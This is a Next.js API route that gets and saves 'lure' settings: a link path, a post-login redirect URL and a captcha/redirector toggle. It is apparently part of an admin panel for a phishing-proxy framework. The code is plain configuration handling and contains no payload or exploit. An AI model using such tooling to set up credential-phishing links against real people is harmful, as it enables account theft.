import { NextApiRequest, NextApiResponse } from "next";
import { configService } from "@/services/configService";

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  try {
    if (req.method === "GET") {
      const config = await configService.readConfig();
      if (!config) {
        return res.status(200).json({
          afterLoginRedirect: "",
          useCaptcha: true,
          linkPath: "",
        });
      }

      // Add null check for lures array
      const lures = config.lures || [];
      // Get values from the first lure, or return defaults
      const lure = lures[0] || {};

      // Get the path, removing leading slash for display in UI
      const path = lure.path || "";
      const displayPath = path.startsWith("/") ? path.substring(1) : path;

      return res.status(200).json({
        afterLoginRedirect: lure.redirect_url || "",
        useCaptcha: lure.redirector === "main",
        linkPath: displayPath, // Return without leading slash for UI display
      });
    } else if (req.method === "POST") {
      const { afterLoginRedirect, useCaptcha, linkPath, lureId } = req.body;

      // If a specific lureId is provided, update that lure instead of the first one
      if (lureId) {
        const success = await configService.updateSpecificLureLinkSettings(
          lureId,
          afterLoginRedirect || "",
          useCaptcha || false,
          linkPath || ""
        );

        if (success) {
          return res
            .status(200)
            .json({ message: "Lure settings updated successfully" });
        } else {
          return res
            .status(500)
            .json({ error: "Failed to update lure settings" });
        }
      } else {
        // The configService will handle ensuring the path has a leading slash
        const success = await configService.updateLinkSettings(
          afterLoginRedirect || "",
          useCaptcha || false,
          linkPath || ""
        );

        if (success) {
          return res
            .status(200)
            .json({ message: "Settings updated successfully" });
        } else {
          return res.status(500).json({ error: "Failed to update settings" });
        }
      }
    } else {
      res.status(405).json({ error: "Method not allowed" });
    }
  } catch (error) {
    console.error("Error handling link settings:", error);
    res.status(500).json({ error: "Internal server error" });
  }
}
